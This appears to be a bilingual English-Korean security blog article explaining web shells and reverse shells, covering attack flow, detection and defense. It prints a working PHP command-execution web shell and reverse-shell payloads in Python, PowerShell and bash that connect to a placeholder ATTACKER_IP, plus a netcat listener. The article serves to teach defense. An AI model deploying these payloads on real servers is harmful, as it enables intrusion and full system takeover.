---
title: Web Shells and Reverse Shells
tags: Web-Shells Reverse-Shells
key: page-web_shells_reverse_shells
categories: [Cybersecurity, Web Security]
author: hyoeun
math: true
mathjax_autoNumber: true
---

### 1. Web Shells: The Master Key to the Web Server

#### What is a Web Shell?

A **web shell** is a malicious script file uploaded to a web server by an attacker to enable remote administration. It can be written in any server-side scripting language, such as PHP, ASP, JSP, or Python. Once successfully uploaded, the attacker can access this script through a web browser to gain a powerful foothold for executing commands on the server's operating system.

#### How They Work

1.  **Upload Vector**: Attackers typically upload web shells through the following methods:

      * **File Upload Vulnerabilities**: When a web application allows users to upload files like images or documents but fails to properly validate the file extension or type, an executable script file (e.g., `.php`, `.jsp`) can be uploaded.
      * **Known Software Vulnerabilities**: Exploiting Remote Code Execution (RCE) vulnerabilities in widely used CMS platforms like WordPress, Joomla, or their plugins to directly create or upload a web shell.
      * **SQL Injection**: If database permissions are sufficient, an attacker can use SQL injection to write malicious code directly to a file in a specific path on the server.

2.  **Execution**: Once the upload is complete, the attacker accesses a URL such as `http://victim-server.com/uploads/shell.php`. The web server processes this request, executes the `shell.php` file, and the attacker receives the output of the command—passed via URL parameters or a POST request body—in the response.

#### Types and Code Examples of Web Shells

Web shells range from simple, single-function scripts to highly sophisticated tools.

  * **Simple Command Execution Shell**
    This is the most basic form, offering only the ability to execute OS commands. Its small size makes it harder to detect.

    **PHP Example:**

    ```php
    <?php
      // Executes the value passed in the 'cmd' URL parameter as a system command
      if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
      }
    ?>
    ```

      * **Usage**: `http://victim-server.com/simple-shell.php?cmd=ls -la`

  * **Feature-Rich Shells**
    Shells like C99, b374k, and PAS fall into this category, providing powerful functionality beyond simple command execution:

      * File exploration and management (upload, download, edit)
      * Direct database connection and query execution
      * Detailed server information (OS, processes, network status)
      * Functionality to spawn a reverse shell
      * Built-in obfuscation and stealth features

#### Web Shell Detection and Defense Strategies

  * **Detection Strategies**

    1.  **File Integrity Monitoring (FIM)**: Monitor file creation, modification, and deletion in web root and upload directories in real-time to detect unauthorized script files.
    2.  **Log Analysis**: Scan web server access logs for requests to suspicious filenames (e.g., `shell.php`, `cmd.asp`) or requests containing parameters related to command execution, such as `cmd=` or `exec=`.
    3.  **Signature-Based Scanning**: Scan server files for code patterns (signatures) of known web shells.
    4.  **Behavior-Based Analysis**: Monitor for anomalous behavior, such as a web server process (`httpd`, `apache2`) spawning a shell process (`/bin/bash`, `cmd.exe`).

  * **Defense Strategies**

    1.  **Eliminate Upload Vulnerabilities**: Use a whitelist approach for file extensions (e.g., only allow `.jpg`, `.png`, `.pdf`), verify the file's actual MIME type, and remove execution permissions from the directory where uploaded files are stored.
    2.  **Minimize Server Permissions**: Configure the web server daemon to run with the principle of least privilege.
    3.  **Disable Dangerous Functions**: In PHP's `php.ini` configuration, disable dangerous functions that can execute system commands, such as `system()`, `exec()`, `shell_exec()`, and `passthru()`.
    4.  **Utilize a Web Application Firewall (WAF)**: Block malicious patterns associated with web shell upload attempts and execution requests.

-----

### 2. Reverse Shells: Bypassing Firewalls with a Connection in Reverse

#### What is a Reverse Shell?

A **reverse shell** is a type of shell session where the **victim machine initiates a connection out to the attacker's machine**. This is the opposite of a "bind shell," where the attacker connects directly to an open port on the victim machine.

#### Why Use a Reverse Shell?

The primary reason is to **bypass firewalls**. Most organizations strictly control inbound traffic coming from the outside to internal servers, but are often more lenient with outbound traffic initiated from the inside. Attackers exploit this by having the victim server connect out to their server, typically on commonly allowed ports like 80 or 443, effectively neutralizing the firewall.

#### How They Work

1.  **Attacker Sets Up a Listener**: The attacker uses a tool like `netcat` on their server to listen for incoming connections on a specific port.
    `nc -lvnp 443`  *(Listens for a connection on port 443)*
2.  **Payload Execution on Victim**: The attacker (often via a web shell) executes a reverse shell payload on the victim server.
3.  **Reverse Connection Established**: The payload makes an outbound connection to the attacker's IP address and port (e.g., 443).
4.  **Shell Acquisition**: Once the connection is established, the victim server's standard input, output, and error streams (stdin, stdout, stderr) are redirected to this network connection. The result is a fully interactive command shell for the attacker, controlled from their own terminal.

#### Reverse Shell Code Examples

Reverse shells can be implemented in many languages and are often achievable with a single line of code.

  * **Python Example**
    ```python
    import socket, subprocess, os

    # Attacker's IP and Port
    RHOST = "ATTACKER_IP"
    RPORT = 443

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))

    # Duplicate standard input, output, and error to the socket
    os.dup2(s.fileno(), 0) # stdin
    os.dup2(s.fileno(), 1) # stdout
    os.dup2(s.fileno(), 2) # stderr

    # Execute /bin/sh to provide a shell
    p = subprocess.call(["/bin/sh", "-i"])
    ```
  * **PowerShell (Windows) One-Liner Example**
    ```powershell
    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    ```
  * **Bash (Linux) One-Liner Example**
    ```bash
    bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
    ```

#### Reverse Shell Detection and Defense Strategies

  * **Detection Strategies**

    1.  **Egress Traffic Filtering and Monitoring**: Thoroughly monitor outbound traffic from servers. A long-lived TCP connection from a web server to an unusual IP or port is highly suspicious and could indicate a reverse shell.
    2.  **Process and Command-Line Auditing**: Continuously audit for web server processes spawning unusual child processes or commands, such as `bash`, `powershell.exe`, `nc`, or `/dev/tcp`.
    3.  **Host-based Intrusion Detection Systems (HIDS)**: Detect anomalous system call patterns that occur when a shell is spawned and a network connection is established.

  * **Defense Strategies**

    1.  **Strict Egress Filtering**: Implement a default "Deny All" policy on your firewall for outbound traffic. Use a whitelist policy to only allow connections to IPs and ports that are absolutely necessary for business functions.
    2.  **Application Whitelisting**: Restrict the programs that can run on a server to a pre-approved list, preventing unauthorized applications like `netcat` from executing in the first place.
    3.  **PowerShell Hardening**: Enforce stricter PowerShell execution policies and enable `Constrained Language Mode` to limit its capabilities.

-----

### 3. The Synergy: A Combined Web Shell and Reverse Shell Attack Scenario

While powerful on their own, web shells and reverse shells are devastating when used together. A typical attack flow looks like this:

1.  **Initial Compromise and Foothold (Web Shell)**: The attacker exploits a file upload vulnerability to upload a simple web shell. This shell provides the first, albeit limited, channel to execute commands. They use it to gather basic system information with commands like `whoami`, `ifconfig`, and `netstat`.

2.  **Recognizing Limitations**: The attacker realizes the web shell is non-interactive, making it impossible to use editors like `vi` or `nano` and difficult to use commands that require a password prompt, like `su` or `sudo`.

3.  **Executing an Advanced Payload (Spawning a Reverse Shell)**: The attacker uses the web shell's command execution capability to download (using `wget` or `curl`) or create a more sophisticated reverse shell client script (like the Python code above). They then execute this script, which initiates a connection back to their listening server.

4.  **Full Interactive Control (Shell Acquisition)**: Once the reverse shell connection is successful, the attacker gains a fully interactive shell on the victim server from their own terminal. From this point on, the attacker can operate as if they were on a local terminal, freely controlling the system to perform lateral movement into the internal network or execute privilege escalation attacks.

In this way, **if a web shell is the tool to pick the lock, the reverse shell is the act of stepping through the door to take over the house.**

-----

### Conclusion

Web shells and reverse shells are among the most frequently used techniques in modern cyber attacks.

  * A **web shell** serves as the **'foothold,'** providing initial access and persistent control over a web server.
  * A **reverse shell** serves as the **'shortcut,'** bypassing firewalls to give the attacker a fully interactive shell for complete system compromise.

An effective response to these threats requires more than a single layer of defense. It is crucial to build a **Defense-in-Depth** strategy that combines **secure coding** to eliminate vulnerabilities, **server hardening** to control permissions, **strict network traffic monitoring**, and **real-time Endpoint Detection and Response (EDR)**.

-----

### 1. 웹쉘: 웹 서버의 문을 여는 만능열쇠

#### 웹쉘이란 무엇인가?

**웹쉘**은 공격자가 원격으로 서버를 제어하기 위해 웹 서버에 업로드하는 악성 스크립트 파일입니다. PHP, ASP, JSP, Python 등 서버에서 실행되는 모든 스크립트 언어로 작성될 수 있습니다. 일단 성공적으로 업로드되면, 공격자는 웹 브라우저를 통해 해당 스크립트에 접속하여 서버의 운영체제에 명령을 내릴 수 있는 강력한 발판을 마련하게 됩니다.

#### 작동 원리

1.  **업로드 벡터**: 공격자는 주로 다음과 같은 경로를 통해 웹쉘을 서버에 업로드합니다.

      * **파일 업로드 취약점**: 웹 애플리케이션이 이미지나 문서 파일 업로드를 허용할 때, 확장자나 파일 타입을 제대로 검증하지 않으면 실행 가능한 스크립트 파일(`.php`, `.jsp`)을 업로드할 수 있습니다.
      * **알려진 소프트웨어 취약점**: WordPress, Joomla 등 널리 사용되는 CMS나 플러그인의 원격 코드 실행(RCE) 취약점을 이용해 웹쉘을 직접 생성하거나 업로드합니다.
      * **SQL 인젝션**: 데이터베이스 권한이 충분할 경우, SQL 인젝션을 통해 서버의 특정 경로에 악성 코드를 직접 쓸 수 있습니다.

2.  **실행**: 업로드가 완료되면 공격자는 브라우저에서 `http://victim-server.com/uploads/shell.php`와 같은 URL로 접근합니다. 웹 서버는 이 요청을 받아 `shell.php` 파일을 실행하고, 공격자는 URL 파라미터나 POST 요청 본문을 통해 전달한 명령의 실행 결과를 응답으로 받게 됩니다.

#### 웹쉘의 종류와 코드 예시

웹쉘은 기능에 따라 단순한 형태부터 매우 정교한 형태까지 다양합니다.

  * **단순 커맨드 실행 쉘 (Simple Command Execution Shell)**
    가장 기본적인 형태로, OS 명령어를 실행하는 기능만 가집니다. 크기가 작아 탐지를 피하기 용이합니다.

    **PHP 예시:**

    ```php
    <?php
      // URL 파라미터 'cmd'로 받은 값을 시스템 명령어로 실행
      if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
      }
    ?>
    ```

      * **사용법**: `http://victim-server.com/simple-shell.php?cmd=ls -la`

  * **다기능 쉘 (Feature-Rich Shells)**
    C99, b374k, PAS 쉘 등이 여기에 해당하며, 단순 명령어 실행을 넘어선 강력한 기능을 제공합니다.

      * 파일 탐색 및 관리 (업로드, 다운로드, 편집)
      * 데이터베이스 직접 연결 및 쿼리 실행
      * 서버 정보 (OS, 프로세스, 네트워크) 상세 조회
      * 리버스쉘 연결 기능 제공
      * 자체적인 난독화 및 은닉 기능

#### 웹쉘 탐지 및 방어 전략

  * **탐지 전략**

    1.  **파일 무결성 모니터링 (FIM)**: 웹 루트 디렉토리 및 업로드 경로에 있는 파일의 생성, 변경, 삭제를 실시간으로 모니터링하여 인가되지 않은 스크립트 파일을 탐지합니다.
    2.  **로그 분석**: 웹 서버 접근 로그에서 의심스러운 파일명(예: `shell.php`, `cmd.asp`)에 대한 요청이나, `cmd=`, `exec=` 등 명령어 실행과 관련된 파라미터를 포함한 요청을 검색합니다.
    3.  **시그니처 기반 스캐닝**: 알려진 웹쉘의 코드 패턴(시그니처)을 기반으로 서버 파일을 스캔합니다.
    4.  **행위 기반 분석**: 웹 서버 프로세스(예: `httpd`, `apache2`)가 비정상적으로 셸 프로세스(`/bin/bash`, `cmd.exe`)를 생성하는 행위를 모니터링하여 탐지합니다.

  * **방어 전략**

    1.  **업로드 취약점 제거**: 파일 업로드 시 확장자를 화이트리스트 방식으로 관리하고(예: `.jpg`, `.png`, `.pdf`만 허용), 파일의 실제 MIME 타입을 검증하며, 업로드된 파일이 저장되는 디렉토리의 실행 권한을 제거합니다.
    2.  **서버 권한 최소화**: 웹 서버 데몬은 최소한의 권한으로 실행되도록 설정합니다.
    3.  **위험 함수 비활성화**: PHP의 경우 `php.ini` 설정에서 `system()`, `exec()`, `shell_exec()`, `passthru()` 등 시스템 명령을 실행할 수 있는 위험한 함수를 비활성화합니다.
    4.  **웹 방화벽(WAF) 활용**: 웹쉘 업로드 시도나 실행 요청과 관련된 악성 패턴을 차단합니다.

-----

### 2. 리버스쉘: 방화벽을 우회하는 역방향 연결

#### 리버스쉘이란 무엇인가?

**리버스쉘**은 공격자의 시스템이 피해자 시스템에 직접 접속하는 대신, **피해자 시스템이 공격자의 시스템으로 접속을 요청**하여 셸을 획득하는 방식입니다. 일반적인 '바인드 쉘(Bind Shell)'이 피해자 시스템에 특정 포트를 열어두고 공격자의 접속을 기다리는 반면, 리버스쉘은 그 반대 방향으로 작동합니다.

#### 리버스쉘을 사용하는 이유

가장 큰 이유는 **방화벽 우회**입니다. 대부분의 조직은 외부에서 내부 서버로 들어오는 인바운드(Inbound) 트래픽은 엄격하게 통제하지만, 내부에서 외부로 나가는 아웃바운드(Outbound) 트래픽은 비교적 관대하게 허용합니다. 공격자는 이 점을 이용해 피해자 서버가 흔히 허용되는 포트(예: 80, 443)를 통해 자신의 서버로 접속하게 만들어 방화벽을 효과적으로 무력화합니다.

#### 작동 원리

1.  **공격자 리스너 설정**: 공격자는 자신의 서버에서 `netcat`과 같은 도구를 사용하여 특정 포트에서 연결을 기다리는 리스너를 실행합니다.
    `nc -lvnp 443`  *(443번 포트에서 연결을 기다립니다)*
2.  **피해자 측 페이로드 실행**: 공격자는 (주로 웹쉘을 통해) 피해자 서버에서 리버스쉘 페이로드를 실행시킵니다.
3.  **역방향 연결 수립**: 페이로드는 공격자의 IP 주소와 포트(예: 443)로 아웃바운드 연결을 시도합니다.
4.  **셸 획득**: 연결이 수립되면, 피해자 서버의 표준 입/출력/에러(stdin, stdout, stderr)가 이 네트워크 연결에 리다이렉션됩니다. 결과적으로 공격자는 자신의 터미널에서 피해자 서버를 자유롭게 제어할 수 있는 완전한 대화형 셸을 얻게 됩니다.

#### 리버스쉘 코드 예시

다양한 언어로 리버스쉘을 구현할 수 있으며, 종종 한 줄짜리 명령어로도 가능합니다.

  * **Python 예시**
    ```python
    import socket, subprocess, os

    # 공격자 IP와 포트
    RHOST = "ATTACKER_IP"
    RPORT = 443

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))

    # 표준 입/출력/에러를 소켓에 복제
    os.dup2(s.fileno(), 0) # stdin
    os.dup2(s.fileno(), 1) # stdout
    os.dup2(s.fileno(), 2) # stderr

    # /bin/sh 실행하여 셸 제공
    p = subprocess.call(["/bin/sh", "-i"])
    ```
  * **PowerShell (Windows) 원라이너 예시**
    ```powershell
    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    ```
  * **Bash (Linux) 원라이너 예시**
    ```bash
    bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
    ```

#### 리버스쉘 탐지 및 방어 전략

  * **탐지 전략**

    1.  **이그레스(Egress) 트래픽 필터링 및 모니터링**: 서버에서 외부로 나가는 아웃바운드 트래픽을 철저히 모니터링합니다. 특히 웹 서버가 비정상적인 IP나 포트로 장시간 TCP 연결을 유지하는 경우 리버스쉘을 의심할 수 있습니다.
    2.  **프로세스 및 커맨드 라인 감사**: 웹 서버 프로세스가 `bash`, `powershell.exe`, `nc`, `/dev/tcp`와 같은 비정상적인 자식 프로세스나 명령어를 실행하는지 지속적으로 감사합니다.
    3.  **호스트 기반 침입 탐지 시스템(HIDS)**: 셸을 생성하고 네트워크 연결을 수립하는 과정에서 발생하는 비정상적인 시스템 콜(System Call) 패턴을 탐지합니다.

  * **방어 전략**

    1.  **엄격한 이그레스 필터링**: 방화벽에서 'Deny All'을 기본 정책으로 설정하고, 업무상 반드시 필요한 IP와 포트로의 아웃바운드 연결만 허용하는 화이트리스트 정책을 적용합니다.
    2.  **애플리케이션 화이트리스팅**: 서버에서 실행될 수 있는 프로그램을 사전에 승인된 목록으로 제한하여 `netcat`과 같은 비인가 프로그램의 실행을 원천 차단합니다.
    3.  **PowerShell 보안 강화**: PowerShell의 실행 정책을 강화하고, `Constrained Language Mode`를 활성화하여 위험한 기능을 제한합니다.

-----

### 3. 시너지 효과: 웹쉘과 리버스쉘의 연계 공격 시나리오

웹쉘과 리버스쉘은 단독으로도 강력하지만, 함께 사용될 때 파괴력이 배가됩니다. 일반적인 공격 흐름은 다음과 같습니다.

1.  **초기 침투 및 발판 마련 (웹쉘)**: 공격자는 파일 업로드 취약점을 이용해 간단한 웹쉘을 서버에 업로드합니다. 이 웹쉘은 제한적이지만 시스템에 명령을 내릴 수 있는 첫 번째 통로가 됩니다. `whoami`, `ifconfig`, `netstat` 등의 명령어로 기본적인 시스템 정보를 수집합니다.

2.  **한계 인식**: 공격자는 웹쉘이 비대화형(non-interactive)이라 `vi`나 `nano` 같은 편집기 사용이 불가능하고, `su`나 `sudo`처럼 암호를 입력해야 하는 명령어를 쓰기 어렵다는 것을 깨닫습니다.

3.  **지능적인 페이로드 실행 (리버스쉘 호출)**: 공격자는 웹쉘의 명령어 실행 기능을 이용하여 더 정교한 리버스쉘 클라이언트 스크립트(예: 위의 Python 코드)를 서버에 다운로드(`wget` 또는 `curl` 사용)하거나 직접 생성합니다. 그리고 이 스크립트를 실행시켜 자신의 리스너 서버로 연결을 유도합니다.

4.  **완전한 장악 (대화형 셸 획득)**: 리버스쉘 연결이 성공하면 공격자는 자신의 터미널에서 피해자 서버의 완전한 대화형(interactive) 셸을 획득합니다. 이제부터 공격자는 마치 로컬 터미널을 사용하는 것처럼 자유롭게 시스템을 제어하며 내부망으로의 추가적인 수평 이동이나 권한 상승 공격을 수행할 수 있게 됩니다.

이처럼 **웹쉘은 문을 따는 도구**라면, **리버스쉘은 그 문 안으로 들어가 안방을 차지하는 행위**에 비유할 수 있습니다.

-----

### 결론

웹쉘과 리버스쉘은 현대 사이버 공격에서 가장 빈번하게 사용되는 공격 기법 중 하나입니다.

  * **웹쉘**은 웹 서버에 대한 초기 접근과 지속적인 제어권을 제공하는 **'발판'** 역할을 합니다.
  * **리버스쉘**은 방화벽을 우회하고 공격자에게 완전한 대화형 셸을 제공하여 시스템을 완전히 장악하기 위한 **'지름길'** 역할을 합니다.

이러한 위협에 효과적으로 대응하기 위해서는 단편적인 방어만으로는 부족합니다. **시큐어 코딩**을 통한 취약점 제거, **서버 보안 강화**를 통한 권한 통제, **엄격한 네트워크 트래픽 모니터링**, 그리고 **실시간 엔드포인트 탐지 및 대응(EDR)**을 결합한 **심층 방어(Defense-in-Depth)** 전략을 구축하는 것이 무엇보다 중요합니다.